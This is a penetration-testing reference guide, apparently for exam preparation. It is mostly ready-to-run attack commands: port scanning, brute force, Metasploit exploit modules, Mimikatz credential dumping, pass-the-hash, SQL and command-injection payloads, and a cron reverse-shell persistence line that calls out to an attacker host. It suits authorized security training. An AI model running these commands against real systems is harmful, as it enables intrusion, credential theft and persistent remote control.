# Advanced Penetration Testing Reference Guide
*Comprehensive attack playbook for ethical hackers and security professionals*

> **‚ö†Ô∏è LEGAL NOTICE**
> This guide is for authorized penetration testing, security research, and educational purposes ONLY. 
> Unauthorized access to computer systems is illegal. Always obtain proper written authorization.

## üìã Table of Contents
- [Quick Start Methodology](#quick-start-methodology)
- [Service Enumeration & Exploitation](#service-enumeration--exploitation)
- [Post-Exploitation Techniques](#post-exploitation-techniques)
- [Privilege Escalation](#privilege-escalation)
- [Common Attack Patterns](#common-attack-patterns)
- [Modern Tools & Techniques](#modern-tools--techniques)
- [Exam Strategy & Checklists](#exam-strategy--checklists)

---

## üöÄ Quick Start Methodology

### Phase 1: Intelligence Gathering (5-15 minutes)
```bash
# Network Discovery
nmap -sn <network>/24                    # Host discovery
nmap -sS -sU -p- -T4 --min-rate 1000 -oA discovery <target>

# Fast service detection
nmap -sV -sC -O --top-ports 1000 -oA services <target>

# Aggressive scan for critical services
nmap -A -p 21,22,23,25,53,80,135,139,443,445,993,995,1433,3306,3389,5432,5900 <target>
```

### Phase 2: Service Enumeration (10-30 minutes)
```bash
# Multi-service scanner
nmap --script vuln,auth,brute -p <open_ports> <target>

# Specific service enumeration (see detailed sections below)
```

### Phase 3: Vulnerability Assessment (15-45 minutes)
```bash
# Automated vulnerability scanning
nmap --script vulners,vulscan -p <ports> <target>
searchsploit <service> <version>
```

### Phase 4: Exploitation & Access (20-60 minutes)
- Manual exploitation using service-specific techniques
- Metasploit modules (detailed in service sections)
- Custom exploit development when needed

### Phase 5: Post-Exploitation (15-30 minutes)
- Privilege escalation
- Persistence (authorized environments only)
- Lateral movement
- Data exfiltration (authorized scope)

---

## üîç Service Enumeration & Exploitation

### üåê HTTP/HTTPS (80, 443, 8080, 8000, 8443, 8888, 9000)

#### Initial Enumeration
```bash
# Basic service detection
nmap -sV --script http-enum,http-headers,http-title -p 80,443 <target>

# Directory enumeration
gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,asp,aspx,jsp,html,txt
ffuf -u http://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

# Technology identification
whatweb <target>
wafw00f <target>

# Vulnerability scanning
nikto -h <target>
```

#### Common Attack Vectors
```bash
# SQL Injection testing
sqlmap -u "http://<target>/page.php?id=1" --batch --level 3 --risk 2

# Cross-Site Scripting (XSS)
# Manual testing with payloads like: <script>alert('XSS')</script>

# File upload vulnerabilities
# Test various file extensions and MIME types

# Local File Inclusion (LFI)
# Test parameters with: ../../../etc/passwd

# Remote File Inclusion (RFI)
# Test with external URLs when applicable
```

#### Metasploit Modules
```ruby
# Common web application exploits
use exploit/multi/http/tomcat_mgr_upload
use exploit/multi/http/jenkins_script_console
use exploit/multi/http/apache_mod_cgi_bash_env_exec
use exploit/multi/http/wordpress_admin_shell_upload

# Web scanner auxiliaries
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/http/files_dir
```

### üîí SSH (22)

#### Enumeration
```bash
# SSH version and algorithm enumeration
nmap --script ssh2-enum-algos,ssh-hostkey -p 22 <target>
ssh-audit <target>

# User enumeration
enum4linux -U <target>
```

#### Attack Methods
```bash
# Brute force attacks
hydra -L users.txt -P passwords.txt ssh://<target>
medusa -h <target> -U users.txt -P passwords.txt -M ssh

# Key-based attacks (if keys found)
ssh -i private_key user@<target>
```

#### Metasploit
```ruby
use auxiliary/scanner/ssh/ssh_login
use auxiliary/scanner/ssh/ssh_enumusers
use auxiliary/scanner/ssh/ssh_version
```

### üìÅ SMB/NetBIOS (139, 445)

#### Comprehensive Enumeration
```bash
# SMB version and shares
smbclient -L //<target> -N
enum4linux -a <target>
smbmap -H <target>

# Null session enumeration
rpcclient -U "" -N <target>
> enumdomusers
> enumdomgroups
> queryuser <username>

# Advanced enumeration
crackmapexec smb <target>
crackmapexec smb <target> --shares
crackmapexec smb <target> -u '' -p '' --shares
```

#### Attack Techniques
```bash
# EternalBlue (MS17-010)
# Check vulnerability first
nmap --script smb-vuln-ms17-010 -p 445 <target>

# Password spraying
crackmapexec smb <target> -u users.txt -p 'Password123!' --continue-on-success

# Pass-the-hash attacks (post-exploitation)
crackmapexec smb <target> -u administrator -H <ntlm_hash>
```

#### Metasploit
```ruby
# Vulnerability scanners
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb2
use auxiliary/scanner/smb/smb_ms17_010

# Exploits
use exploit/windows/smb/ms17_010_eternalblue
use exploit/windows/smb/ms08_067_netapi
use exploit/windows/smb/ms17_010_psexec

# Post-exploitation
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/admin/smb/psexec_command
```

### üñ•Ô∏è RDP (3389)

#### Enumeration
```bash
# RDP detection and enumeration
nmap --script rdp-enum-encryption,rdp-vuln-ms12-020 -p 3389 <target>
rdesktop -A <target>
```

#### Attacks
```bash
# Brute force
hydra -L users.txt -P passwords.txt rdp://<target>
crowbar -b rdp -s <target>/32 -u admin -C passwords.txt

# BlueKeep exploitation (CVE-2019-0708)
# Extremely dangerous - use only in authorized labs
```

#### Metasploit
```ruby
use auxiliary/scanner/rdp/rdp_login
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

### üóÑÔ∏è Database Services

#### MySQL (3306)
```bash
# Enumeration
nmap --script mysql-info,mysql-vuln-cve2012-2122 -p 3306 <target>

# Connection attempts
mysql -h <target> -u root -p
mysql -h <target> -u root # No password

# Brute force
hydra -L users.txt -P passwords.txt mysql://<target>
```

```ruby
# Metasploit
use auxiliary/scanner/mysql/mysql_login
use auxiliary/scanner/mysql/mysql_version
use auxiliary/admin/mysql/mysql_enum
use auxiliary/admin/mysql/mysql_sql
```

#### PostgreSQL (5432)
```bash
# Enumeration
nmap --script pgsql-brute -p 5432 <target>

# Connection
psql -h <target> -U postgres -d postgres

# Brute force
hydra -L users.txt -P passwords.txt postgres://<target>
```

```ruby
# Metasploit
use auxiliary/scanner/postgres/postgres_login
use auxiliary/scanner/postgres/postgres_version
use exploit/linux/postgres/postgres_copy_from_program_cmd_exec
```

#### MSSQL (1433, 1434)
```bash
# Enumeration
nmap --script ms-sql-info,ms-sql-empty-password -p 1433 <target>

# Connection
sqlcmd -S <target> -U sa -P password

# Brute force
hydra -L users.txt -P passwords.txt mssql://<target>
```

```ruby
# Metasploit
use auxiliary/scanner/mssql/mssql_login
use auxiliary/admin/mssql/mssql_enum
use auxiliary/admin/mssql/mssql_exec
use exploit/windows/mssql/mssql_payload
```

### üîä SNMP (161/162 UDP)

#### Enumeration
```bash
# Community string enumeration
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target>

# SNMP walking
snmpwalk -v2c -c public <target>
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.1.5.0  # System name
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.1.6.0  # Running processes

# Advanced enumeration
snmp-check <target>
```

#### Metasploit
```ruby
use auxiliary/scanner/snmp/snmp_login
use auxiliary/scanner/snmp/snmp_enum
use auxiliary/scanner/snmp/snmp_enumshares
use auxiliary/scanner/snmp/snmp_enumusers
```

### üéØ VNC (5900+)

#### Enumeration & Attacks
```bash
# VNC detection
nmap --script vnc-info,vnc-title -p 5900-5906 <target>

# Connection attempts
vncviewer <target>:5900
vncviewer <target>:5901

# Brute force VNC passwords
hydra -P passwords.txt vnc://<target>
```

#### Metasploit
```ruby
use auxiliary/scanner/vnc/vnc_login
use auxiliary/scanner/vnc/vnc_none_auth
```

### üìÆ Email Services

#### SMTP (25, 465, 587)
```bash
# User enumeration
smtp-user-enum -M VRFY -U users.txt -t <target>
smtp-user-enum -M EXPN -U users.txt -t <target>

# Manual testing
telnet <target> 25
> VRFY root
> VRFY admin
```

#### POP3 (110, 995) & IMAP (143, 993)
```bash
# Brute force
hydra -L users.txt -P passwords.txt pop3://<target>
hydra -L users.txt -P passwords.txt imap://<target>
```

---

## üîì Post-Exploitation Techniques

### Linux Post-Exploitation

#### System Information Gathering
```bash
# Basic system info
uname -a
cat /etc/os-release
whoami
id
groups

# Network configuration
ifconfig -a
ip addr show
netstat -antup
ss -tulpn

# Process enumeration
ps aux --forest
ps -eo pid,user,command
```

#### Credential Harvesting
```bash
# Search for passwords in files
grep -r -i "password" /etc/ /var/ /home/ 2>/dev/null
find / -name "*password*" -type f 2>/dev/null
find / -name "*.conf" -type f -exec grep -l "password" {} \; 2>/dev/null

# SSH keys
find / -name "authorized_keys" 2>/dev/null
find / -name "id_rsa*" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# History files
cat ~/.bash_history
cat ~/.mysql_history
find /home -name ".*history" -exec cat {} \; 2>/dev/null
```

#### Persistence Mechanisms
```bash
# Cron jobs (authorized environments only)
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'" | crontab -

# SSH key persistence
mkdir -p ~/.ssh
echo "<public_key>" >> ~/.ssh/authorized_keys

# Service persistence
# Create systemd service (complex - document thoroughly)
```

### Windows Post-Exploitation

#### System Information
```cmd
# Basic info
systeminfo
whoami /all
net user
net localgroup administrators
net config workstation

# Network info
ipconfig /all
netstat -ano
route print
arp -a
```

#### Credential Harvesting
```cmd
# Registry password locations
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Common password locations
dir /s *password*
dir /s *cred*
findstr /si password *.txt *.xml *.ini *.config

# Browser passwords (tools like LaZagne)
```

#### Advanced Techniques (Authorized Labs Only)
```cmd
# Mimikatz for credential extraction
mimikatz.exe
> privilege::debug
> sekurlsa::logonpasswords
> lsadump::sam

# PowerShell for advanced enumeration
powershell -ep bypass
Import-Module PowerSploit
Get-UnquotedService
Get-ModifiableServiceFile
```

---

## ‚¨ÜÔ∏è Privilege Escalation

### Linux Privilege Escalation

#### Automated Enumeration
```bash
# Download and run enumeration scripts
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
./linux-exploit-suggester.sh
./LinEnum.sh
```

#### Manual Checks
```bash
# SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Writable directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null

# Sudo privileges
sudo -l
cat /etc/sudoers

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Kernel exploits (research based on version)
uname -r
cat /etc/issue
```

#### Common Privilege Escalation Vectors
```bash
# Exploiting sudo misconfigurations
sudo -l
# If you see (ALL) NOPASSWD: /bin/vi
sudo vi
:!/bin/bash

# SUID binary exploitation
# Example: find exploitable SUID binaries on GTFOBins

# Cron job exploitation
# Look for world-writable scripts in cron jobs

# Kernel exploits (last resort, use carefully)
# Research specific kernel version exploits
```

### Windows Privilege Escalation

#### Automated Tools
```cmd
# PowerUp for service abuse
powershell -ep bypass
Import-Module PowerUp.ps1
Invoke-AllChecks

# WinPEAS
winPEASx64.exe

# Sherlock for missing patches
Import-Module Sherlock.ps1
Find-AllVulns
```

#### Manual Enumeration
```cmd
# Service permissions
accesschk.exe -accepteula -uwcqv "Authenticated Users" *
sc qc <service_name>

# Registry permissions
accesschk.exe -accepteula -uvwqk HKLM\System\CurrentControlSet\Services

# Unquoted service paths
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\

# Stored credentials
cmdkey /list
runas /savecred /user:<username> cmd
```

---

## üéØ Common Attack Patterns

### Web Application Attacks

#### SQL Injection Patterns
```sql
-- Basic union injection
' UNION SELECT 1,2,3--
' UNION SELECT null,username,password FROM users--

-- Boolean-based blind injection
' AND 1=1--
' AND 1=2--

-- Time-based blind injection
'; WAITFOR DELAY '00:00:05'--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
```

#### File Upload Bypass Techniques
```bash
# Extension bypasses
file.php.jpg
file.php%00.jpg (null byte)
file.php;.jpg
file.pHp

# MIME type bypasses
Content-Type: image/jpeg (while uploading PHP)

# Magic bytes
Add GIF89a; at beginning of PHP file
```

#### Command Injection Patterns
```bash
# Basic command injection
; ls -la
| whoami
&& id
` cat /etc/passwd `

# Bypassing filters
cat /etc/passwd
c""at /etc/passwd
c'a't /etc/passwd
$(cat /etc/passwd)
```

### Network Attacks

#### Password Spraying
```bash
# Single password against multiple users
crackmapexec smb <target> -u users.txt -p 'Password123!'
crackmapexec winrm <target> -u users.txt -p 'Password123!'

# Hydra password spraying
hydra -L users.txt -p 'Password123!' ssh://<target>
```

#### Lateral Movement
```bash
# WMI execution
wmiexec.py domain/user:password@<target>

# PSExec
psexec.py domain/user:password@<target>

# Pass-the-Hash
pth-winexe -U domain/user%hash //<target> cmd
```

---

## üîß Modern Tools & Techniques

### Automated Reconnaissance
```bash
# AutoRecon - comprehensive automated scanning
autorecon <target>

# nmapAutomator
./nmapAutomator.sh <target> All

# Reconnoitre
reconnoitre -t <target> -o ./results --services
```

### Active Directory Enumeration
```bash
# BloodHound data collection
SharpHound.ps1
Invoke-BloodHound -CollectionMethod All

# PowerView enumeration
Get-NetDomain
Get-NetUser
Get-NetGroup
Get-NetComputer
```

### Cloud Security Testing
```bash
# AWS enumeration (authorized scope only)
aws s3 ls
aws iam list-users
aws ec2 describe-instances

# Azure enumeration
az account list
az vm list
az storage account list

# Google Cloud
gcloud projects list
gcloud compute instances list
```

### Container Security
```bash
# Docker enumeration
curl -s http://<target>:2375/containers/json
docker -H tcp://<target>:2375 ps

# Kubernetes enumeration
kubectl --server=https://<target>:6443 get pods --all-namespaces
```

---

## üìù Exam Strategy & Checklists

### Time Management Strategy
- **0-15 min**: Network discovery and port scanning
- **15-45 min**: Service enumeration and quick wins
- **45-120 min**: Exploitation attempts and privilege escalation
- **120-150 min**: Post-exploitation and lateral movement
- **Last 30 min**: Documentation and cleanup

### Quick Win Checklist
```markdown
‚ñ° Check for anonymous SMB/FTP access
‚ñ° Test default credentials on all services
‚ñ° Check for unprotected databases (MongoDB, Redis, Elasticsearch)
‚ñ° Look for exposed web admin panels
‚ñ° Test for SNMP with community strings: public, private, manager
‚ñ° Check for VNC with no password
‚ñ° Look for exposed Docker API (port 2375)
‚ñ° Test for anonymous LDAP binding
‚ñ° Check for TFTP access (UDP 69)
```

### Documentation Template
```markdown
# Target: <IP/Hostname>
## Scope Authorization
- Lab environment: [Name]
- Authorization: [Document reference]
- Date: [Date]

## Discovery Results
- Open ports: [List]
- Services identified: [List with versions]

## Vulnerabilities Found
1. **[Vulnerability Name]**
   - Severity: [High/Medium/Low]
   - Port/Service: [Details]
   - Description: [Brief description]
   - Evidence: [Screenshots/output]

## Exploitation Steps
1. [Command run]
   - Output: [Result]
   - Timestamp: [Time]

## Impact Assessment
- Access level achieved: [User/Admin/System]
- Data accessed: [Description]
- Lateral movement possibilities: [Details]

## Recommendations
- [Specific remediation steps]
```

### Emergency Commands Reference Card
```bash
# Quick full scan
nmap -sS -sU -A --script vuln -p- <target>

# Fast service enum
nmap -sV -sC --top-ports 1000 <target>

# SMB quick check
smbclient -L //<target> -N
enum4linux -a <target>

# Web quick enum
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt
nikto -h <target>

# Database quick check
mysql -h <target> -u root
psql -h <target> -U postgres

# SNMP quick check
snmpwalk -v2c -c public <target>
```

---

## üìö Additional Resources

### Essential Wordlists
```bash
# SecLists location
/usr/share/seclists/

# Common wordlists
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
/usr/share/seclists/Usernames/Names/names.txt
```

### Reference Sites
- **OWASP Testing Guide**: https://owasp.org/www-project-web-security-testing-guide/
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings
- **HackTricks**: https://book.hacktricks.xyz/
- **GTFOBins**: https://gtfobins.github.io/
- **LOLBAS**: https://lolbas-project.github.io/

### Metasploit Quick Reference
```ruby
# Essential commands
search <term>
use <module>
show options
set <parameter> <value>
run or exploit
sessions -l
sessions -i <id>
```

---

## ‚öñÔ∏è Legal and Ethical Considerations

### Before You Begin
1. **Always obtain written authorization** before testing any system
2. **Define scope clearly** - what systems, what methods, what time windows
3. **Have an emergency contact** and escalation procedure
4. **Document everything** - commands, timestamps, findings
5. **Follow responsible disclosure** for any vulnerabilities found

### During Testing
- Stay within authorized scope
- Avoid destructive actions unless explicitly authorized
- Don't access, modify, or delete sensitive data
- Report critical findings immediately
- Maintain confidentiality of all findings

### After Testing
- Provide comprehensive report to authorized personnel
- Securely delete any captured data (unless retention is authorized)
- Follow up on remediation efforts
- Maintain confidentiality of vulnerabilities until patched

---

## üéØ Final Exam Tips

1. **Practice the methodology** until it's muscle memory
2. **Know your tools** - don't waste time figuring out syntax
3. **Document as you go** - don't rely on memory
4. **Stay calm under pressure** - skip difficult targets and come back
5. **Read instructions carefully** - understand what evidence is required
6. **Test in safe environments** first - know what your exploits do
7. **Have backup plans** - if one attack vector fails, try others
8. **Time management is crucial** - don't get stuck on one target

Remember: The goal is to demonstrate competency in ethical hacking methodologies, not to cause damage or access unauthorized data.

---

*This guide is for authorized security testing only. Always ensure you have proper permission before testing any system.*